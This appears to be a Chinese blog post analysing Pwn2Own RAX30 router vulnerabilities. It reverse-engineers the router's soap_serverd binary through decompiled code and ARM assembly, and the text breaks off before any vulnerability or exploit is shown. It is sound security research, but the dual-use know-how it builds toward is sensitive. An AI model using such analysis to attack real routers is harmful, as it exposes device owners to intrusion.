<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="viol1t">





<title>Pwn2Own-RAX30 Routers漏洞分析 | viol1t</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Pwn2Own-RAX30 Routers漏洞分析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">九月 19, 2023&nbsp;&nbsp;10:29:11</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Pwn2Own-RAX30-Routers漏洞分析"><a href="#Pwn2Own-RAX30-Routers漏洞分析" class="headerlink" title="Pwn2Own-RAX30 Routers漏洞分析"></a>Pwn2Own-RAX30 Routers漏洞分析</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote>
<p>Team82 disclosed five vulnerabilities in <strong><a target="_blank" rel="noopener" href="https://www.netgear.com/home/wifi/routers/rax30/">NETGEAR’s Nighthawk RAX30</a></strong> routers as part of its research and participation in last December’s <strong><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2022/12/5/pwn2own-toronto-2022-day-one-results">Pwn2Own Toronto hacking competition</a></strong>.</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>固件下载链接：<a target="_blank" rel="noopener" href="https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.9.92.zip">https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.9.92.zip</a></p>
<p>固件下载之后binwalk可以直接解包，有漏洞在soap_serverd文件中，这是一个soap的server端，所以首先逆向分析一下这个二进制文件</p>
<p>发现start这里不太能直接看出main函数，所以看一下汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">(<span class="type">void</span> (*a1)(<span class="type">void</span>), <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp-4h] [bp-4h]</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+0h] [bp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a4);</span><br><span class="line">  _libc_start_main(</span><br><span class="line">    (<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **))*(&amp;off_4D60 + <span class="number">67722</span>),</span><br><span class="line">    v4,</span><br><span class="line">    (<span class="type">char</span> **)va,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))*(&amp;off_4D60 + <span class="number">67740</span>),</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))*(&amp;off_4D60 + <span class="number">67745</span>),</span><br><span class="line">    a1,</span><br><span class="line">    va);</span><br><span class="line">  <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到main函数是sub_49F4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00004D18                 MOV             R11, #0</span><br><span class="line">.text:00004D1C                 MOV             LR, #0</span><br><span class="line">.text:00004D20                 POP             &#123;R1&#125;    ; argc</span><br><span class="line">.text:00004D24                 MOV             R2, SP  ; ubp_av</span><br><span class="line">.text:00004D28                 PUSH            &#123;R2&#125;    ; stack_end</span><br><span class="line">.text:00004D2C                 PUSH            &#123;R0&#125;    ; rtld_fini</span><br><span class="line">.text:00004D30                 LDR             R10, =(_GLOBAL_OFFSET_TABLE_ - 0x4D60)</span><br><span class="line">.text:00004D34                 ADR             R3, off_4D60</span><br><span class="line">.text:00004D38                 ADD             R10, R10, R3 ; _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:00004D3C                 LDR             R12, =(off_46FE4 - 0x46CA0)</span><br><span class="line">.text:00004D40                 LDR             R12, [R10,R12] ; nullsub_1</span><br><span class="line">.text:00004D44                 PUSH            &#123;R12&#125;   ; fini</span><br><span class="line">.text:00004D48                 LDR             R3, =(off_46FD0 - 0x46CA0)</span><br><span class="line">.text:00004D4C                 LDR             R3, [R10,R3] ; sub_30450 ; init</span><br><span class="line">.text:00004D50                 LDR             R0, =(off_46F88 - 0x46CA0)</span><br><span class="line">.text:00004D54                 LDR             R0, [R10,R0] ; sub_49F4 ; main</span><br><span class="line">.text:00004D58                 BL              __libc_start_main</span><br><span class="line">.text:00004D5C                 BL              abort</span><br></pre></td></tr></table></figure>

<p>跟进分析</p>
<p>添加dpmnlv这些参数</p>
<p>初始化日志系统，消息模块，主功能模块</p>
<p>初始化成功，则调用相应功能函数</p>
<p>如果失败，则释放资源并返回错误码</p>
<p>主功能函数是sub_8FC0和sub_58C8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_49F4</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+1Ch] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">8786</span>;</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    v7 = getopt(a1, argv, <span class="string">&quot;d:p:m:n:l:v&quot;</span>);</span><br><span class="line">    v8 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      log_log(<span class="number">5</span>, <span class="string">&quot;main&quot;</span>, <span class="number">534</span>, <span class="string">&quot;using soapserver serverPort=%ld shmId=%d&quot;</span>, off_47008, v17);</span><br><span class="line">      cmsLog_initWithName(v5, *argv);</span><br><span class="line">      cmsLog_setLevel(v6);</span><br><span class="line">      v9 = cmsMsg_initWithFlags(v5, <span class="number">0</span>, &amp;dword_48244);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = log_log(<span class="number">3</span>, <span class="string">&quot;main&quot;</span>, <span class="number">541</span>, <span class="string">&quot;cmsMsg_init failed, ret=%d&quot;</span>, v9);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v13 = cmsMdm_initWithAcc(v5, <span class="number">16</span>, dword_48244, &amp;v17);</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = <span class="number">0</span>;</span><br><span class="line">          sub_8FC0(v4);</span><br><span class="line">          v14 = sub_58C8(v2);</span><br><span class="line">          cmsMdm_cleanup(v14);</span><br><span class="line">          v15 = cmsMsg_cleanup(&amp;dword_48244);</span><br><span class="line">          cmsLog_cleanup(v15);</span><br><span class="line">          <span class="keyword">return</span> v8;</span><br><span class="line">        &#125;</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">&quot;main&quot;</span>, <span class="number">548</span>, <span class="string">&quot;cmsMdm_init failed, ret=%d&quot;</span>, v13);</span><br><span class="line">        v10 = cmsMsg_cleanup(&amp;dword_48244);</span><br><span class="line">      &#125;</span><br><span class="line">      cmsLog_cleanup(v10);</span><br><span class="line">      <span class="keyword">return</span> v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">100</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v11 = atoi(optarg);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="number">1</span> )</span><br><span class="line">        v6 = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v7 - <span class="number">108</span>) &gt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_24:</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">&quot;main&quot;</span>, <span class="number">528</span>, <span class="string">&quot;bad arguments, exit&quot;</span>);</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;usage: %s [-d num] [-p port_num] [-m shmid] [-v]\\n&quot;</span>, *argv);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;       d: set verbosity, where num==0 is LOG_LEVEL_ERR, 1 is LOG_LEVEL_NOTICE, all others is LOG_LEVEL_DEBUG&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;       p: TCP port number for httpd to listen on&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;       m: shared memory id, -1 if standalone or not using shared mem.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;       v: show Netgear SOAP API version.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> ( atoi(optarg) == <span class="number">1</span> )</span><br><span class="line">          v2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">        v17 = atoi(optarg);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        v4 = atoi(optarg);</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">8785</span>;</span><br><span class="line">          v4 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">        off_47008 = (<span class="type">void</span> *)atoi(optarg);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3.84&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_8FC0函数就是初始化，获取并调用初始化后的处理函数</p>
<p>sub_58C8函数主要是处理SOAP请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_58C8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  fd = <span class="number">0</span>;</span><br><span class="line">  addr_len = <span class="number">28</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v73, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">  signal(<span class="number">13</span>, (<span class="type">__sighandler_t</span>)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v71.sa_mask, <span class="number">0</span>, <span class="number">0x88</span>u);</span><br><span class="line">  v71.sa_handler = (<span class="type">__sighandler_t</span>)sub_4EBC;</span><br><span class="line">  v71.sa_flags = <span class="number">0x80000000</span>;</span><br><span class="line">  v1 = sigaction(<span class="number">15</span>, &amp;v71, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">616</span>, <span class="string">&quot;failed to install SIGTERM handler, ret=%d&quot;</span>, v1);</span><br><span class="line">  v2 = sigaction(<span class="number">2</span>, &amp;v71, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">&quot;soap_main&quot;</span>, <span class="number">622</span>, <span class="string">&quot;failed to install SIGINT handler, ret=%d&quot;</span>, v2);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  optval.__fds_bits[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">  <span class="built_in">strcpy</span>(addr, <span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">  v4 = socket(<span class="number">10</span>, <span class="number">524289</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">    v6 = *_errno_location();</span><br><span class="line">    v7 = strerror(v6);</span><br><span class="line">    